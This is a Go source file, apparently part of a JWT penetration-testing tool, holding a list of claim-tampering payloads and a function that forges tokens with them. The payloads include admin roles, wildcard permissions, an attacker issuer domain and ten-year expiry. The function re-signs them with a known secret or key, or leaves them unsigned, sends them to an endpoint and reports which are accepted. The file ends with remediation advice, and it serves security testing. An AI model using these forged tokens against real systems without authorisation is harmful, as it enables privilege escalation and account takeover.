package main

import (
	"fmt"
	"log"
	"strings"
	"time"
)

// tamperTarget describes a claim modification to test.
type tamperTarget struct {
	Claim     string
	Value     interface{}
	Desc      string
	Severity  string
}

// tamperPayloads defines common claim tampering targets for privilege escalation.
var tamperPayloads = []tamperTarget{
	{"role", "admin", "Role escalation to admin", "HIGH"},
	{"role", "superuser", "Role escalation to superuser", "HIGH"},
	{"roles", []string{"admin", "superuser"}, "Roles array escalation", "HIGH"},
	{"admin", true, "Admin flag set to true", "HIGH"},
	{"is_admin", true, "is_admin flag set to true", "HIGH"},
	{"isAdmin", true, "isAdmin flag set to true", "HIGH"},
	{"sub", "admin", "Subject changed to admin", "MEDIUM"},
	{"sub", "root", "Subject changed to root", "MEDIUM"},
	{"user", "admin", "User changed to admin", "MEDIUM"},
	{"username", "admin", "Username changed to admin", "MEDIUM"},
	{"iss", "https://attacker.example.com", "Issuer changed to attacker domain", "MEDIUM"},
	{"aud", "attacker-service", "Audience changed to attacker service", "MEDIUM"},
	{"scope", "admin read write delete", "Scope expanded to admin", "HIGH"},
	{"scopes", []string{"admin", "read", "write", "delete"}, "Scopes expanded", "HIGH"},
	{"permissions", []string{"*"}, "Wildcard permissions", "HIGH"},
	{"exp", time.Now().Add(365 * 24 * time.Hour).Unix(), "Expiration extended by 1 year", "MEDIUM"},
	{"exp", time.Now().Add(10 * 365 * 24 * time.Hour).Unix(), "Expiration extended by 10 years", "MEDIUM"},
	{"iat", time.Now().Unix(), "Issued-at reset to now", "LOW"},
	{"nbf", 0, "Not-before removed", "LOW"},
	{"jti", "", "JWT ID removed (replay)", "MEDIUM"},
}

// testClaimTamper tests claim tampering attacks by modifying JWT claims
// and re-signing with the known secret (if provided) or testing against the server.
// This simulates an attacker who has obtained the HMAC secret (e.g., via brute-force)
// and attempts privilege escalation by modifying claims.
func testClaimTamper(cfg *Config) {
	if cfg.Endpoint != "" && !confirmOnline(cfg) {
		return
	}

	header, payload, _, err := decodeTokenParts(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to decode token: %v", err)
	}

	alg, err := getAlg(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to extract algorithm: %v", err)
	}

	// Determine the secret to use for re-signing
	secret := cfg.Secret
	if secret == "" {
		// If no secret provided, try brute-forced secret or prompt
		fmt.Print("Enter HMAC secret for tampering (or press Enter to test unsigned): ")
		fmt.Scanln(&secret)
	}

	report := Report{}
	found := false

	headerCopy := copyHeader(header)
	headerCopy["alg"] = alg

	for _, tp := range tamperPayloads {
		// Create a deep copy of the payload
		payloadCopy := make(map[string]interface{})
		for k, v := range payload {
			payloadCopy[k] = v
		}
		payloadCopy[tp.Claim] = tp.Value

		var forged string
		var signErr error

		if secret != "" && strings.HasPrefix(alg, "HS") {
			forged, signErr = constructHmacJWT(headerCopy, payloadCopy, []byte(secret), alg)
		} else if secret != "" && strings.HasPrefix(alg, "RS") && cfg.PrivKeyFile != "" {
			// RS256 tampering with provided private key
			privKey, err := loadPrivateKeyFromFile(cfg.PrivKeyFile)
			if err != nil {
				log.Printf("Failed to load private key: %v", err)
				continue
			}
			forged, signErr = constructRSAJWT(headerCopy, payloadCopy, privKey)
		} else {
			// No secret available: generate unsigned variant to test claim validation
			headerEnc, _ := encodeTokenPart(headerCopy)
			payloadEnc, _ := encodeTokenPart(payloadCopy)
			forged = headerEnc + "." + payloadEnc + "."
		}

		if signErr != nil {
			continue
		}

		if cfg.Endpoint != "" {
			accepted, status, body := sendTokenAndCheck(cfg, forged)
			if accepted {
				fmt.Printf("[VULNERABLE] Claim tamper accepted: %s=%v (HTTP %d)\n", tp.Claim, tp.Value, status)
				addResult(&report, VulnerabilityResult{
					Name:        fmt.Sprintf("Claim Tampering: %s (confirmed)", tp.Claim),
					Category:    "Claim Tampering",
					Severity:    tp.Severity,
					Description: fmt.Sprintf("%s. Server accepted modified claim %s=%v (HTTP %d). Body: %s", tp.Desc, tp.Claim, tp.Value, status, truncate(body, 200)),
					Payload:     forged,
					Confirmed:   true,
					Details: map[string]string{
						"claim":      tp.Claim,
						"value":      fmt.Sprintf("%v", tp.Value),
						"algorithm":  alg,
						"status_code": fmt.Sprintf("%d", status),
					},
				})
				report.Logs = append(report.Logs, fmt.Sprintf("Token: %s", forged))
				found = true
			}
		} else {
			fmt.Printf("[Tamper] %s=%v -> %s\n", tp.Claim, tp.Value, forged)
			addResult(&report, VulnerabilityResult{
				Name:        fmt.Sprintf("Claim Tampering: %s (offline)", tp.Claim),
				Category:    "Claim Tampering",
				Severity:    tp.Severity,
				Description: fmt.Sprintf("%s. Generated token with modified claim %s=%v.", tp.Desc, tp.Claim, tp.Value),
				Payload:     forged,
				Confirmed:   false,
				Details: map[string]string{
					"claim":     tp.Claim,
					"value":     fmt.Sprintf("%v", tp.Value),
					"algorithm": alg,
				},
			})
			report.Logs = append(report.Logs, forged)
			found = true
		}
	}

	if !found && cfg.Endpoint != "" {
		addResult(&report, newResult(
			"Claim Tampering (not vulnerable)",
			"Claim Tampering",
			"INFO",
			"All tampered tokens were rejected by the server",
		))
	}

	report.Recommendations = append(report.Recommendations,
		"Implement server-side authorization checks independent of JWT claims",
		"Validate all claims (iss, aud, exp, nbf) on every request",
		"Use short-lived tokens (TTL < 15 minutes) with refresh token rotation",
		"Store critical permissions server-side, not in JWT claims",
		"Use stateful session validation for privileged operations",
	)
	writeReport(cfg.ReportFile, report)
}

// truncate shortens a string to maxLen characters, appending "..." if truncated.
func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}
